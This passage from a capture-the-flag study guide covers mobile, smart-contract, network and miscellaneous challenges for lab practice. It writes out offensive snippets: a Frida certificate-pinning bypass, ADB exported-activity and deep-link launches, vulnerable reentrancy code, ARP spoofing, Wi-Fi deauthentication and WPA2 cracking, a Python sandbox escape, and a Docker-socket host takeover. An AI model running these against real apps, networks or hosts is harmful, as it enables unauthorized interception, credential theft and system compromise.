Common findings: plaintext SharedPreferences, unencrypted SQLite (SQLCipher absence), secrets hardcoded in code, data on external/shared storage, sensitive data in logs.

### 9.8 Intent-Based Attacks
```bash
adb shell am start -n com.target.app/.AdminActivity
```
Exported components bypass app-internal auth flow assumptions. Implicit intents can be intercepted by a malicious app registered for the same action; unrestricted broadcast receivers blindly trust senders.

### 9.9 WebView Vulnerabilities
```java
webView.getSettings().setJavaScriptInterface(myObject, "Android");
```
`addJavascriptInterface` + untrusted/remote content loaded = a web XSS escalates to native code execution with the app's full permissions — far more severe than browser XSS.

### 9.10 iOS Side
```bash
unzip -l app.ipa
plutil -convert xml1 Info.plist -o -
```
Serious dynamic analysis genuinely needs a jailbroken device. **Keychain** vs `NSUserDefaults`/plain-file storage is iOS's equivalent of the SharedPreferences-misuse question. Frida works on iOS too (Objective-C/Swift hooking).

### 9.11 MobSF — Automated Triage
```bash
python3 manage.py runserver   # localhost:8000, drag-and-drop APK/IPA
```
Use as the always-first triage step before manual JADX/Frida work.

### 9.12 Certificate Pinning Bypass Beyond One-Liners
```javascript
Java.perform(function() {
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
        console.log("[*] Bypassing pin check for: " + hostname);
        return;
    };
});
```
Identify the specific pinning library via static JADX review before writing a targeted hook.

### 9.13 Practice Path
OWASP MASTG/MSTG (best free reference) → **DVHMA** / **InsecureBankv2** (deliberately vulnerable practice apps) → TryHackMe "Mobile Hacking" → picoCTF mobile → HackTheBox mobile → MobSF on real sample APKs.

### 9.14 Trick Questions (Pass 1)
- Client-side-only checks are never truly secure — the client is fully attacker-controlled; server-side enforcement is the real boundary.
- SSL pinning bypass doesn't break TLS encryption, just gets the app to trust your own proxy cert (requires device access, not a remote attack).
- `android:exported` historically defaulted true for components with an intent-filter even unset — a legacy gotcha.
- Smali patching (permanent, redistributable) vs Frida (live, session-only) — different use cases.

### 9.15 Root/Jailbreak Detection — A Layered Arms Race
Real apps layer: `su` binary checks, root-management package checks, build-tag checks (`test-keys` vs `release-keys`), writable-system-partition checks, and **Frida-detection itself** (default port scan, injected-library scan, `/proc/<pid>/maps` inspection). Community multi-hook bypass scripts + Objection's `android root disable` handle most at once — don't stop after patching the first check found.

### 9.16 Deep Links / App Links
```bash
adb shell am start -W -a android.intent.action.VIEW -d "myapp://reset-password?token=123"
```
Mobile's CSRF-equivalent — a crafted link tapped by the victim performs an unintended action with their existing session, including into a WebView (9.9 crossover). Find registered schemes via `<intent-filter><data android:scheme="...">` in the manifest. High bug-bounty value: remotely triggerable, zero physical access, one click.

### 9.17 Biometric Authentication Bypass
If the biometric result is just a UI-gating boolean rather than unlocking an actual hardware-backed key (Android Keystore/iOS Secure Enclave), it's bypassable the same as any client-side check — hook the success callback directly.

### 9.18 Native Library (.so) Analysis
```bash
file lib/arm64-v8a/libnative.so   # then open directly in Ghidra (Category 3/8 ARM workflow)
```
Logic deliberately moved to native code is often hidden specifically to defeat JADX-only analysis — always check `lib/` exists.

### 9.19 Code Obfuscation (ProGuard/R8)
Renames classes/methods to meaningless short names, strips unused code — not a security boundary. Pivot strategy: follow **string constants** (error messages, URLs, SharedPreferences keys usually can't be obfuscated without breaking functionality) and structural/lifecycle patterns instead of names.

### 9.20 Tapjacking
Mobile's Clickjacking equivalent — invisible/transparent overlay tricks taps into a hidden legitimate dialog underneath. Check for `FLAG_WINDOW_IS_OBSCURED`/`setFilterTouchesWhenObscured` absence.

### 9.21 Clipboard and Screenshot Leakage
Clipboard content (OTPs, passwords) readable by other apps on many Android configs. Task-switcher/screenshot leakage for sensitive screens lacking `FLAG_SECURE`.

### 9.22 Dynamic Code Loading
`DexClassLoader` usage / runtime `.apk`/`.dex`/`.jar` downloads post-install — a remote-code-injection surface if not integrity-checked (crossover with 8.20's firmware-update attacks), and a Play Store policy violation pattern to recognize in JADX review.

### 9.23 Updated Practice Path
Everything from 9.13, plus: revisit InsecureBankv2 specifically for deep-link/WebView patterns · practice one heavily ProGuard/R8-obfuscated real APK with the string-following strategy · confirm you can pivot into Ghidra for a `lib/` native `.so`.

### 9.24 Trick Questions (Pass 2)
- Clipboard-based OTP sniffing is documented real malware behavior, not hypothetical.
- ProGuard/R8 isn't a security control — Frida hooks by class/method signature, not name; "security through obscurity is not security."
- Deep-link bugs command bug-bounty premium because they're remotely triggerable with zero physical access, a one-click severity profile similar to web CSRF/XSS.

---

## 10. Blockchain Security

### 10.1 Lab Setup
```bash
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs
curl -L https://foundry.paradigm.xyz | bash
foundryup
mkdir hardhat-project && cd hardhat-project
npm install --save-dev hardhat && npx hardhat init
pip3 install slither-analyzer mythril
pip3 install solc-select
solc-select install 0.8.19 && solc-select use 0.8.19
# Remix IDE: remix.ethereum.org, no install
```

### 10.2 Mental Model
A smart contract runs on a shared, adversarial, append-only computer: public code, any caller, gas costs real money, bugs are permanent (no patching unless an upgrade mechanism was built in — itself a security-relevant design choice).

### 10.3 Solidity Fundamentals
```solidity
contract Bank {
    mapping(address => uint256) public balances;
    function deposit() public payable { balances[msg.sender] += msg.value; }
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
    }
}
```
`msg.sender`, `msg.value`, state variables persist on-chain, `payable`, gas = genuine economic attack surface (gas-griefing, DoS-via-expensive-loop).

### 10.4 Reentrancy — The Foundational Bug
```solidity
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    (bool success, ) = msg.sender.call{value: amount}("");   // BEFORE balance update — vulnerable order
    require(success, "Transfer failed");
    balances[msg.sender] -= amount;
}
```
Attacker contract's `receive()` re-calls `withdraw()` before the balance ever decrements, draining funds recursively.
**Fix — Checks-Effects-Interactions:**
```solidity
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    balances[msg.sender] -= amount;                           // EFFECT first
    (bool success, ) = msg.sender.call{value: amount}("");     // INTERACTION last
    require(success, "Transfer failed");
}
```
Case study: **The DAO hack, 2016, ~$60M**, caused the Ethereum/Ethereum Classic hard fork. Practice: **Ethernaut "Reentrancy"** level first.

### 10.5 Integer Overflow/Underflow
Pre-0.8.0 Solidity silently wraps on overflow/underflow (subtracting past zero → `2^256-1`). **Solidity 0.8.0+ reverts by default** — but `unchecked { }` blocks reintroduce the old behavior deliberately (review these blocks carefully). Always check `pragma solidity` version first.

### 10.6 Access Control Vulnerabilities
```solidity
function setOwner(address newOwner) public { owner = newOwner; }   // MISSING require(msg.sender==owner)
```
Fix: use OpenZeppelin's audited `Ownable`/`onlyOwner` rather than hand-rolled checks.

### 10.7 Oracle Manipulation
```solidity
function getPrice() public view returns (uint256) {
    return tokenB.balanceOf(pool) / tokenA.balanceOf(pool);   // instantly manipulable
}
```
Attack: flash-loan a huge amount, dump into the pool to skew the ratio, call the victim contract (reads the skewed price), exploit, reverse, repay — all atomic, one transaction. Fix: TWAP oracles or Chainlink. Practice: **Damn Vulnerable DeFi**'s oracle-manipulation levels.

### 10.8 Flash Loans
Borrow with zero collateral, repay within the same transaction or the whole transaction reverts (lender bears zero risk). The capital-requirement multiplier behind most large-scale oracle-manipulation/governance attacks since ~2020.

### 10.9 Front-Running / MEV
Pending transactions sit in a public mempool; higher-gas transactions can be submitted to execute first ("sandwich attacks"). Mitigations: commit-reveal schemes, private relays (Flashbots). A structural issue, not a code bug — even perfectly-coded contracts remain subject to it.

### 10.10 Smart-Contract-Specific DoS
```solidity
for (uint i = 0; i < recipients.length; i++) { payable(recipients[i]).transfer(rewardAmount); }
```
One recipient rejecting ETH (no `receive()`, or always-reverting) blocks the entire loop for everyone. Fix: **pull-payment pattern** (OpenZeppelin `PullPayment`) instead of push.

### 10.11 Governance Attacks
Flash-loan-borrowed governance tokens can temporarily swing a vote to pass a malicious proposal within one block, then return the tokens. Fix: **checkpointing** — voting power snapshotted at a past block (e.g. Compound's COMP).

### 10.12 Auditing Tools
```bash
slither contract.sol
myth analyze contract.sol
```
Etherscan verified source (`etherscan.io/address/<addr>#code`) = read Solidity directly; unverified = raw EVM bytecode RE (Panoramix or manual disassembly).

### 10.13 Practice Path
**Ethernaut** (ethernaut.openzeppelin.com, 20+ levels, start here) → **Damn Vulnerable DeFi** (after Ethernaut) → **Capture the Ether** → Paradigm CTF archives → read real post-mortems on **rekt.news**.

### 10.14 Trick Questions (Pass 1)
- Reentrancy is unique because the "attacker" makes a completely normal, permitted external call — pure state-ordering bug, not unauthorized access.
- Immutability is often the point (trustlessness); upgradeable proxy patterns exist for planned upgrades but introduce their own access-control risk.
- Flash loans carry no lender risk due to atomic enforcement — no real-finance equivalent.
- Bugs are fixable; MEV/front-running exploits the public/ordered nature of blockchain transactions itself — structural, not fixable by better code alone.

### 10.15 ERC Token Standard-Specific Vulnerabilities
**ERC-20 approve race condition** — front-running an `approve()` change lets a spender claim both old+new allowance; fix via `increaseAllowance`/`decreaseAllowance` or zero-then-set.
**ERC-777 hook reentrancy** — `tokensReceived` hook reintroduces reentrancy even in contracts following CEI for ETH (Uniswap/Lendf.Me hack, 2020, ~$25M).
**ERC-721 (NFT)** — `safeTransferFrom`'s `onERC721Received` hook is its own reentrancy vector; also metadata/ownership-check bugs.

### 10.16 Signature-Related Vulnerabilities
**Signature replay** — missing nonce/chain ID lets a valid signature be resubmitted, even cross-chain (why EIP-155 added chain ID post-2016-fork). **`ecrecover` returning address(0)** on invalid input — must explicitly check against zero. **Signature malleability** — ECDSA signatures can be algebraically transformed into a different-looking but still-valid signature, bypassing naive "has this exact signature been used" replay protection.

### 10.17 Cross-Chain/Bridge Vulnerabilities — Largest Real-Dollar-Loss Category
Ronin Bridge (~$625M), Wormhole (~$325M), Poly Network (~$611M). Patterns: validator-layer signature-verification compromise, fake-deposit-event spoofing, minting-logic bugs independent of cross-chain verification. Required reading: rekt.news post-mortems on all three.

### 10.18 Proxy/Upgradeable Contract Vulnerabilities
Proxy holds state, `delegatecall`s to a swappable implementation that holds logic, executed in the proxy's storage context.
- **Storage collision** — misaligned variable layout between proxy/implementation silently corrupts state. Fix: Unstructured Storage pattern.
- **Uninitialized proxy / implementation takeover** — `initialize()` callable by anyone if not atomic with deployment (Parity multisig freeze, 2017, ~$280M locked).
- **Function selector clashes** — Transparent Proxy Pattern routes by `msg.sender` to prevent admin/implementation selector collisions.

### 10.19 Private Key / Wallet-Level Security
Weak/predictable seed generation (PRNG crossover, 2.7) · phishing/fake wallet-connect prompts (e.g. malicious `setApprovalForAll`) — arguably more common than contract-bug exploitation for individuals · hardware wallets as the secure-element equivalent from Category 8. Tool: **Tenderly's transaction simulator** to inspect a transaction's real effect before signing.

### 10.20 Gas-Related Attacks Beyond 10.10
**Gas griefing** — forcing excessive gas usage via large return-data payloads, pushing past the block gas limit. **Unbounded loops over user-growable arrays** — design-level, not single-bad-actor DoS; the contract becomes literally unexecutable at scale.

### 10.21 Fuzzing Smart Contracts
```solidity
function testFuzz_Withdraw(uint256 amount) public {
    vm.assume(amount <= 100 ether);
    // invariant checks across thousands of random inputs
}
```
```bash
forge test --fuzz-runs 10000
```
Standard real-world/competitive-audit practice, including invariant testing.

### 10.22 Updated Practice Path
Everything from 10.13, plus: read Ronin/Wormhole/Poly Network post-mortems (highest-value addition) · revisit Damn Vulnerable DeFi for token-standard/proxy-bug levels · write one Foundry fuzz test yourself.

### 10.23 Trick Questions (Pass 2)
- Bridges are an outsized target because they concentrate enormous locked value in one custom cross-chain trust mechanism.
- `delegatecall` executes callee code in caller storage with no type-checking across the boundary — why storage-layout discipline is critical.
- Wallet/phishing security matters as much as contract auditing because no contract-level security prevents a user from voluntarily signing a malicious transaction.

---

## 11. Network Analysis

### 11.1 Lab Setup
```bash
sudo apt install -y wireshark && sudo usermod -aG wireshark $USER
sudo apt install -y tshark tcpdump nmap
wget https://www.netresec.com/?download=NetworkMiner -O networkminer.zip
sudo apt install -y zeek ngrep netcat-openbsd
pip3 install scapy
sudo apt install -y tcpflow
```

### 11.2 Mental Model
Everything is nested envelopes: Ethernet frame → IP packet → TCP/UDP segment → application payload. Read at every layer, recognize normal to spot abnormal.

### 11.3 TCP/IP Fundamentals
Three-way handshake: SYN → SYN-ACK → ACK. Filter `tcp.flags.syn==1` to inventory every connection start. `tcp.flags.reset==1` flood = port scan signature. TTL starting value hints OS (Linux ~64, Windows ~128, network gear ~255).

### 11.4 Wireshark Deep Dive
```
ip.addr == 10.0.0.5
ip.src == 10.0.0.5 && ip.dst == 10.0.0.6
tcp.port == 443
http.request.method == "POST"
tcp.analysis.retransmission
dns.qry.name contains "suspicious"
frame contains "flag"
tcp.stream eq 4
```
Follow TCP/UDP/HTTP Stream · Export Objects (auto-reassembles transferred files) · Statistics → Conversations/Protocol Hierarchy/Endpoints.
**Workflow**: Protocol Hierarchy → Conversations → Follow interesting streams → Export Objects.

### 11.5 DNS Analysis
```bash
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -20
```
DNS tunneling: abnormally long/high-entropy subdomains at high frequency to one domain. DNS TXT records sometimes used for C2 command delivery.

### 11.6 Nmap
```bash
nmap -sV -sC target.com
nmap -p- target.com
nmap -A target.com
nmap -sU target.com
```
Scan fingerprints in PCAP: **SYN scan** (SYN→SYN-ACK→RST, no data) · **Connect scan** (full handshake, empty connection) · **FIN/NULL/Xmas** (unusual flag combos probing malformed-packet handling).

### 11.7 Protocol-Specific Analysis
FTP/Telnet: plaintext credentials via `ftp.request.command=="PASS"` filter + Follow Stream. SMB: Export Objects for file extraction. ARP: `arp` filter, flood of conflicting IP→MAC mappings = ARP spoofing.
```bash
sudo apt install -y dsniff
arpspoof -i eth0 -t 10.0.0.5 10.0.0.1
```

### 11.8 TLS/SSL Traffic Analysis
Cannot read payload, but CAN see: **SNI** (`tls.handshake.extensions_server_name`, cleartext hostname) · certificate details (cleartext) · **JA3/JA3S fingerprinting** (client/server negotiation fingerprint, no payload needed).
Decrypt with a keylog file: Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename.

### 11.9 Zeek — Structured Log Analysis
```bash
zeek -r capture.pcap
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto service duration
```
Your tool of choice the moment a PCAP is "too large to scroll through" — SOC-scale analysis via `conn.log`/`http.log`/`dns.log`/`files.log`/`ssl.log`.

### 11.10 tshark/scapy Scripting
```bash
tshark -r capture.pcap -q -z conv,ip
tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort -u
```
```python
from scapy.all import *
packets = rdpcap('capture.pcap')
for pkt in packets:
    if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
        print(pkt[DNSQR].qname)
pkt = IP(dst="10.0.0.5")/TCP(dport=80, flags="S")
send(pkt)
```

### 11.11 Malware Traffic Patterns
**Beaconing** — regular check-in intervals, visible via Conversations timing or scripted delta-analysis. **DGA (Domain Generation Algorithms)** — high-entropy pronounceable domains, mostly NXDOMAIN. Cross-reference IPs/domains/hashes against **AbuseIPDB**/**VirusTotal**.

### 11.12 Practice Path
picoCTF network → TryHackMe "Wireshark: The Basics/Packet Operations/Traffic Analysis" (3-part series) → **Malware-Traffic-Analysis.net** → CyberDefenders.org network-forensics → Root-Me/CTFtime.

### 11.13 Trick Questions (Pass 1)
- TLS handshake metadata (SNI, cert, JA3) leaks by structural necessity (must negotiate before encrypting).
- SYN scan "stealth" is largely historical — modern defenses detect it at the packet level regardless.
- Zeek's structured logs scale (grep/sort/pipe) where manual packet browsing doesn't, for real SOC-sized captures.
- TTL-based OS fingerprinting is a rough inference (unknown hop count), not certainty.

### 11.14 Routing Protocol Attacks
**BGP hijacking** — no built-in cryptographic trust; an AS can announce routes it doesn't own (2008 YouTube/Pakistan Telecom incident, real crypto-exchange hijacks). **OSPF/RIP** internal-route manipulation. **DHCP spoofing/starvation** — rogue DHCP server races the legitimate one; tools `dhcpstarv`, `Yersinia`.

### 11.15 VLAN Hopping (802.1Q Double-Tagging)
Misconfigured switches forward double-tagged frames into an unauthorized VLAN, bypassing logical isolation.

### 11.16 Wireless (802.11/WiFi) Analysis
```bash
sudo apt install -y aircrack-ng
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c <channel> --bssid <target_mac> -w capture wlan0mon
aireplay-ng -0 5 -a <target_mac> wlan0mon
aircrack-ng -w rockyou.txt capture-01.cap
```
WPA3's SAE/Dragonfly handshake specifically resists this offline-dictionary pattern (WPA2 remains crackable this way). **Evil Twin/Rogue AP**: `airbase-ng`. Wireshark opens `.cap` natively with 802.11-specific filters.

### 11.17 Bluetooth/BLE Analysis
```bash
sudo apt install -y bluez bluez-tools
hcitool scan
sudo apt install -y btlejack
```
**Ubertooth One** = dedicated BLE sniffing hardware (needs frequency-hopping awareness beyond a generic SDR).

### 11.18 Honeypot Detection/Evasion
Recognizing textbook-perfect protocol responses or implausibly easy vulnerabilities as honeypot indicators — a real analytical skill in threat hunting.

### 11.19 Network-Level Steganography/Covert Channels (Deep Dive)
TCP sequence-number covert channels · timing-based covert channels (inter-packet gaps encode bits) · `ptunnel` (real TCP-over-ICMP tunneling tool). Detection requires statistical/behavioral analysis (Zeek/scapy), not manual packet browsing.

### 11.20 IDS/IPS (Suricata/Snort)
```bash
sudo apt install -y suricata
suricata -r capture.pcap -c /etc/suricata/suricata.yaml -l output/
cat output/fast.log
```
Rule-based automated triage — run first on a hard PCAP, then focus manual effort on what it flags.

### 11.21 Updated Practice Path
Everything from 11.12, plus: TryHackMe WiFi-hacking room · run Suricata against a known-malicious PCAP from malware-traffic-analysis.net · read the 2008 Pakistan Telecom/YouTube BGP hijack case study.

### 11.22 Trick Questions (Pass 2)
- BGP's trust-everyone design is a 1980s legacy assumption; RPKI mitigates but adoption is incomplete.
- WPA2 handshake cracking is offline (fully local after capture) — same scalability logic as offline hash-cracking elsewhere.
- Suricata/Snort is a first-triage step for scale, not a replacement for manual deep-dive on flagged incidents.

---

## 12. Miscellaneous

### 12.1 Lab Setup
```bash
git clone https://github.com/gchq/CyberChef.git   # or https://gchq.github.io/CyberChef/
file --version; strings --version; xxd --version; hexdump --version
pip3 install pwntools pycryptodome numpy
sudo apt install -y jq imagemagick bc
# dcode.fr and tio.run — bookmark, no install needed
```

### 12.2 Mental Model
Misc = "everything that didn't fit elsewhere." The real skill is **triage speed**: correctly identify which category's toolkit a given file/string actually needs.

### 12.3 Universal First-Move Checklist
```bash
file mystery_file
xxd mystery_file | head -20
strings mystery_file | head -50
exiftool mystery_file
binwalk mystery_file
```
Then feed suspicious strings into CyberChef's **Magic wand** (auto-detects/tries dozens of encodings, ranks by "how English does this look").

### 12.4 Encoding/Compression Chain-Solving
```bash
echo "H4sIAAAAAAAA..." | base64 -d | gunzip
```
Signatures: Base64 (`A-Za-z0-9+/`, `=` padding) · Gzip (`1f 8b`) · Zlib (`78 9c`/`78 01`/`78 da`) · Hex (`0-9a-f`, even length).
```python
import base64, zlib, binascii
step1 = base64.b64decode(data)
step2 = zlib.decompress(step1)
step3 = binascii.unhexlify(step2)
```
CyberChef is almost always faster than scripting by hand — drop to Python only for custom logic.

### 12.5 Esoteric Programming Languages
**Brainfuck** — 8-instruction language on a byte array; just run it (tio.run), don't hand-trace. **Malbolge, Piet, Whitespace, LOLCODE, INTERCAL** — know the names; "solve" = find/use an online interpreter unless the challenge requires modifying the code.

### 12.6 Regex-Heavy and Programming-Logic Puzzles
Straightforward programming puzzles in CTF costume — solid Python fundamentals is the real skill tested. Z3 (from 3.6) applies to any "find X satisfying constraints" puzzle outside RE too.

### 12.7 QR Codes/Barcodes Beyond Stego's Coverage
```bash
zbarimg mystery.png
convert mystery.png -negate fixed.png
convert mystery.png -rotate 180 fixed.png
zbarimg fixed.png
```
Aztec/Data Matrix/PDF417 — `zbarimg` handles most; manual visual ID as fallback.

### 12.8 Audio/Visual Puzzle Formats Beyond Category 6
Morse code (beeps/flashing lights) · semaphore/braille/sign-language alphabets (recognize the shape, search the standard mapping) · musical notation as encoding (note names spell a message).

### 12.9 Puzzle-Hunt-Style Lateral Thinking
Anagram puzzles (dcode.fr solver, or Python permutation+dictionary check) · cipher wheels/pigpen (recognize the visual symbol alphabet) · riddles in challenge flavor text (misc hides genuine hints there more than other categories) · coordinate/map puzzles (test suspicious numeric pairs as lat/long in Google Maps, Category 7 crossover). Core skill: list every plausible interpretation and cheaply test each, don't fixate on your first guess.

### 12.10 Jupyter/Python Sandbox Escape Challenges
```python
().__class__.__bases__[0].__subclasses__()   # walk Python's class hierarchy to find an escape even when `import os` is blocked
```
Conceptually parallels Category 4's seccomp escapes, at the interpreter level instead of syscall level.

### 12.11 Compression Format Deep Cuts
```bash
# 7z: 37 7A BC AF 27 1C | RAR: "Rar!" | bzip2: "BZh" | zstd: 28 B5 2F FD
7z x mystery.7z
unrar x mystery.rar
bzip2 -d mystery.bz2
zstd -d mystery.zst
```
Authors sometimes pick obscure formats specifically to defeat automatic `binwalk`/`file` detection.

### 12.12 ASCII Art, Unicode Tricks, Font/Rendering Puzzles
ASCII art hiding a message (visible or shape-encoded) · Unicode homoglyph tricks (visually identical chars, different byte values — check with `xxd`) · font/ligature puzzles (displayed text can lie — check raw underlying character codes).

### 12.13 Time-Based and Physical/Real-World Puzzles
```bash
date -d @1700000000   # Unix timestamp conversion
```
Timezone trickery · "meta" puzzles referencing the platform itself (flag-format quirks, challenge-name anagrams/puns, upload-metadata hints).

### 12.14 Practice Path
picoCTF misc (best start) → explore CyberChef's full operation list deliberately → Root-Me misc → TryHackMe misc/puzzle rooms → CTFtime "misc" writeups (breadth over depth — no fixed syllabus here).

### 12.15 Trick Questions (Pass 1)
- "Misc" exists as the catch-all for creative puzzle design that doesn't map to a single technical discipline.
- The universal first-move checklist is disproportionately effective here because misc challenges are unclassified by definition.
- Python sandbox escapes work because `__class__`/`__bases__`/`__subclasses__` introspection isn't considered an "import" and is hard to comprehensively blocklist — generalizes to Category 4's "blocking the obvious path rarely closes every path" lesson.

### 12.16 Checksum/Hash-Based Puzzle Variants
```bash
pip3 install hashid
hashid '$2b$12$KIXQ...'
```
**Hash format identification** as the entire puzzle, not just a step toward cracking. **CRC32/Adler32 forging** — CRC32 is NOT cryptographically collision-resistant; you can forge a file to a chosen CRC32 by appending calculated bytes — forging, not breaking, a different puzzle type than Category 2 hash-cracking.

### 12.17 Polyglot/Multi-Format Language Puzzles
A single file valid as Python AND Perl AND Bash simultaneously, exploiting each language's comment/parsing quirks. Recognize by: extension mismatch, or successful execution under multiple interpreters with different output — try several interpreters deliberately.

### 12.18 Social-Engineering-Flavored Misc Challenges
Acrostic messages (first letter of each line) · linguistic steganography (word-length/sentence-count encoding, not file-level) · **Cicada 3301** as the canonical "misc taken to the extreme" real-world case study (crypto+stego+OSINT+physical clues across years) — read a writeup for lateral-thinking exposure.

### 12.19 Container/Virtualization-Escape Misc Challenges
```bash
cat /proc/1/cgroup
ls -la /
mount
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```
If the Docker socket is mounted inside a container, spin up a new container mounting the host's root filesystem — instant host access. A real, documented misconfiguration class, not an invented scenario.

### 12.20 "Guessy" Flag-Format Speedrunning
Assuming plaintext contains `flag{` lets you derive XOR keys/partial decodings backward from known-plaintext (Category 2 crossover, applied heuristically). CyberChef's Magic + Regular-expression operations can search decoded candidates for flag-format matches automatically.

### 12.21 Esolang/Code-Golf Extensions
**Piet** — program is a literal bitmap image, colored regions = instructions (dedicated interpreter: `npiet`). **Code golf** — shortest-program challenges, tests raw language fluency; reference: codegolf.stackexchange.com.

### 12.22 Updated Practice Path
Everything from 12.14, plus: set up a deliberately misconfigured local Docker container (socket mounted) and practice the escape safely · read a Cicada 3301 writeup once · drill `hashid` against varied hash formats until recognition is instant.

### 12.23 Trick Questions (Pass 2)
- CRC32 is forgeable because it was designed only for accidental-corruption detection, with zero adversarial/cryptographic design goals — unlike SHA-256.
- A mounted Docker socket = effective root on the host, because the Docker daemon itself runs as root — Docker's own docs warn against exactly this.
- Linguistic/writing-style stego evades every binary-forensics tool because the hidden channel is purely in human-language choices, outside any file-structure anomaly.

---

## Closing Notes

All 12 categories above received at least one full pass; most received two. No finite document is ever truly "complete" for fields this deep (RE, pwn, crypto, and OSINT especially have genuinely no bottom) — the fastest way to close remaining gaps from here is **hands-on practice**, not more reading:

- Start with the **Universal Foundations** (top of this document) if any feel shaky.
- Work category by category using the practice-path sections in order.
- When stuck for 30+ minutes on a single challenge, move on and come back later — read writeups only after a genuine attempt.
- Revisit this document as a reference, not a cover-to-cover read — use the Table of Contents to jump to whatever category a challenge touches.

